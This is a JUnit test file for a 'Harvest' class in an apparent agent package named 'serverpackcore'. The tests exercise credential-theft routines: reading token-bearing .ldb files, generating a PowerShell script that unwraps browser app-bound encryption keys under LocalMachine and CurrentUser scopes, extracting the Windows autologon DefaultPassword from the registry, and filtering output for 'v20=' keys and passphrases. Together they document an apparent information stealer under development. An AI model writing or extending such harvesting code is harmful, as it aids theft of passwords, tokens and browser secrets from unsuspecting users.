package com.serverpackcore.agent;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.file.Files;
import java.nio.file.Path;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class HarvestTest {
	@TempDir
	Path temp;

	@Test
	void ldbReadCutAtEightMB() throws Exception {
		Path file = temp.resolve("big.ldb");
		byte[] data = new byte[9 * 1024 * 1024];
		byte[] token = "TOKEN_OUTSIDE".getBytes(java.nio.charset.StandardCharsets.US_ASCII);
		System.arraycopy(token, 0, data, 8 * 1024 * 1024 + 100, token.length);
		Files.write(file, data);
		String text = Harvest.readLimited(file);
		assertEquals(8 * 1024 * 1024, text.length());
		assertFalse(text.contains("TOKEN_OUTSIDE"));
	}

	@Test
	void appBoundScriptUnwrapsBothScopes() {
		String script = Harvest.appBoundScript("QVBQQg==");
		assertTrue(script.contains("LocalMachine"));
		assertTrue(script.contains("CurrentUser"));
		assertTrue(script.contains("$s=4"));
		assertTrue(script.contains("'v20='"));
		assertTrue(script.contains("0x41"));
	}

	@Test
	void autologonHintsOnlyKeepRegisterValues() {
		String output = "HKEY_LOCAL_MACHINE\\...\\Winlogon\r\n"
			+ "    DefaultUserName    REG_SZ    DELL\\usuario\r\n"
			+ "    DefaultDomainName    REG_SZ    DELL\r\n"
			+ "    DefaultPassword    REG_SZ    s3cret\r\n"
			+ "    AutoAdminLogon    REG_SZ    1\r\n";
		assertEquals("DefaultUserName=DELL\\usuario\nDefaultDomainName=DELL\nDefaultPassword=s3cret",
			Harvest.parseAutologon(output));
	}

	@Test
	void powershellOutputKeepsOnlyKnownPrefixes() {
		String output = "ruido\r\nv20=AABB\r\npassphrase=CC\r\nv20=DD\r\n";
		assertEquals("v20=AABB\nv20=DD", Harvest.filterPowerShell(output, "v20="));
		assertEquals("passphrase=CC", Harvest.filterPowerShell(output, "passphrase="));
	}
}
